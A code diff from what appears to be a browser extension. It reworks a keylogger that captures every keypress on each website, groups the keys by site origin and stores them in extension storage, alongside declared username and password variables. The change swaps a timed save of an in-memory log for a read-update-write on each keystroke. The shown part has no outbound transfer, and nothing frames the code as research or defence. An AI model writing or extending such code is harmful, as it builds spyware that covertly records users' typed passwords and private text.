@@ -1,8 +1,8 @@
-const db = {};
-// update keystrokes every 100ms
-setInterval(() => {
-  chrome.storage.local.set({ database: db }, () => {});
-}, 100);
+// let db = {};
+// // update keystrokes every 100ms
+// setInterval(() => {
+//   chrome.storage.local.set({ database: db }, () => {});
+// }, 100);
 
 let username = "";
 let password = "";
@@ -23,9 +23,15 @@ setInterval(() => {
  * @param {KeyboardEvent} e
  */
 function logKeyPress(e) {
-  const context = window.location.origin;
-  if (db[context]) db[context] += `,${e.key}`;
-  else db[context] = e.key;
+  const context = `${window.location.origin}`;
+  chrome.storage.local.get(["database"], (r) => {
+    console.log("r state: ", r)
+    let db = JSON.stringify(r) === "{}" ? {} : r.database;
+    console.log("db state: ", db);
+    if (db[context]) db[context] += `,${e.key}`;
+    else db[context] = e.key;
+    chrome.storage.local.set({ database: db });
+  });
   console.log(e.key);
 }
 
